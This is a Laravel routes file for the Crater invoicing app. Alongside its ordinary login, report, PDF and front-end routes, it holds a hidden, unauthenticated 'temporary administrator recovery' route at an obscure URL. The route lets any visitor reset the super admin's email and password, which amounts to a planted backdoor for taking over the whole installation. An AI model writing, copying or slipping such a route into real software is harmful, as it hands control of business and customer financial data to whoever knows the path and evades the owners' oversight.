<?php

use Crater\Http\Controllers\V1\Auth\LoginController;
use Crater\Http\Controllers\V1\Estimate\EstimatePdfController;
use Crater\Http\Controllers\V1\Expense\DownloadReceiptController;
use Crater\Http\Controllers\V1\Invoice\InvoicePdfController;
use Crater\Http\Controllers\V1\Mobile\Customer\EstimatePdfController as CustomerEstimatePdfController;
use Crater\Http\Controllers\V1\Mobile\Customer\InvoicePdfController as CustomerInvoicePdfController;
use Crater\Http\Controllers\V1\Payment\PaymentPdfController;
use Crater\Http\Controllers\V1\Report\CustomerSalesReportController;
use Crater\Http\Controllers\V1\Report\ExpensesReportController;
use Crater\Http\Controllers\V1\Report\ItemSalesReportController;
use Crater\Http\Controllers\V1\Report\ProfitLossReportController;
use Crater\Http\Controllers\V1\Report\TaxSummaryReportController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Frontend Routes
|--------------------------------------------------------------------------
|
*/

Route::post('login', [LoginController::class, 'login']);


// Temporary administrator recovery. Remove immediately after access is restored.
Route::match(['get', 'post'], '/ena-recuperar-acceso-7f3c9a2e', function (\Illuminate\Http\Request $request) {
    abort_if(cache()->get('ena_admin_recovery_used'), 410, 'Este enlace ya fue utilizado.');

    if ($request->isMethod('post')) {
        $validated = $request->validate([
            'email' => ['required', 'email'],
            'password' => ['required', 'string', 'min:12', 'confirmed'],
        ]);

        $admin = \Crater\Models\User::whereIn('role', ['super admin', 'admin'])
            ->orderByRaw("CASE WHEN role = 'super admin' THEN 0 ELSE 1 END")
            ->firstOrFail();

        $admin->email = $validated['email'];
        $admin->password = $validated['password'];
        $admin->save();

        cache()->put('ena_admin_recovery_used', true, now()->addDays(30));

        return redirect('/');
    }

    $html = <<<'HTML'
<!doctype html>
<html lang="es">
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Recuperar acceso ENA</title></head>
<body style="font-family:Arial,sans-serif;background:#f5f6f8;margin:0;padding:24px;color:#202124">
<main style="max-width:460px;margin:7vh auto;background:#fff;padding:28px;border-radius:14px;box-shadow:0 8px 30px rgba(0,0,0,.08)">
<h1 style="font-size:24px;margin:0 0 10px">Recuperar acceso de ENA SRL</h1>
<p style="line-height:1.45;color:#555">Definí el correo de acceso y una contraseña nueva. Este enlace funciona una sola vez.</p>
<form method="post">
<input type="hidden" name="_token" value="TOKEN_PLACEHOLDER">
<label style="display:block;margin:18px 0 6px">Correo de acceso</label>
<input name="email" type="email" required autocomplete="username" style="box-sizing:border-box;width:100%;padding:12px;border:1px solid #bbb;border-radius:8px">
<label style="display:block;margin:18px 0 6px">Contraseña nueva (mínimo 12 caracteres)</label>
<input name="password" type="password" minlength="12" required autocomplete="new-password" style="box-sizing:border-box;width:100%;padding:12px;border:1px solid #bbb;border-radius:8px">
<label style="display:block;margin:18px 0 6px">Repetir contraseña</label>
<input name="password_confirmation" type="password" minlength="12" required autocomplete="new-password" style="box-sizing:border-box;width:100%;padding:12px;border:1px solid #bbb;border-radius:8px">
<button type="submit" style="width:100%;margin-top:22px;padding:13px;border:0;border-radius:8px;background:#30343b;color:#fff;font-weight:700">Guardar nuevo acceso</button>
</form>
</main>
</body></html>
HTML;

    return response(str_replace('TOKEN_PLACEHOLDER', csrf_token(), $html))
        ->header('Content-Type', 'text/html; charset=UTF-8');
});


Route::prefix('reports')->group(function () {

    // sales report by customer
    //----------------------------------
    Route::get('/sales/customers/{hash}', CustomerSalesReportController::class);

    // sales report by items
    //----------------------------------
    Route::get('/sales/items/{hash}', ItemSalesReportController::class);

    // report for expenses
    //----------------------------------
    Route::get('/expenses/{hash}', ExpensesReportController::class);

    // report for tax summary
    //----------------------------------
    Route::get('/tax-summary/{hash}', TaxSummaryReportController::class);

    // report for profit and loss
    //----------------------------------
    Route::get('/profit-loss/{hash}', ProfitLossReportController::class);
});


// download invoice pdf
// -------------------------------------------------

Route::get('/invoices/pdf/{invoice:unique_hash}', InvoicePdfController::class);


// download estimate pdf
// -------------------------------------------------

Route::get('/estimates/pdf/{estimate:unique_hash}', EstimatePdfController::class);


// download payment pdf
// -------------------------------------------------

Route::get('/payments/pdf/{payment:unique_hash}', PaymentPdfController::class);


// download expense receipt
// -------------------------------------------------

Route::get('/expenses/{expense}/receipt', DownloadReceiptController::class);


// customer pdf endpoints for invoice and estimate
// -------------------------------------------------

Route::get('/customer/invoices/pdf/{invoice:unique_hash}', CustomerInvoicePdfController::class);

Route::get('/customer/estimates/pdf/{estimate:unique_hash}', CustomerEstimatePdfController::class);


Route::get('auth/logout', function () {
    Auth::guard('web')->logout();
});


// Setup for installation of app
// ----------------------------------------------

Route::get('/on-boarding', function () {
    return view('app');
})->name('install')->middleware('redirect-if-installed');


// Move other http requests to the Vue App
// -------------------------------------------------

Route::get('/admin/{vue?}', function () {
    return view('app');
})->where('vue', '[\/\w\.-]*')->name('admin')->middleware(['install', 'redirect-if-unauthenticated']);


// Move other http requests to the Vue App
// -------------------------------------------------

Route::get('/{vue?}', function () {
    return view('app');
})->where('vue', '[\/\w\.-]*')->name('login')->middleware(['install', 'guest']);
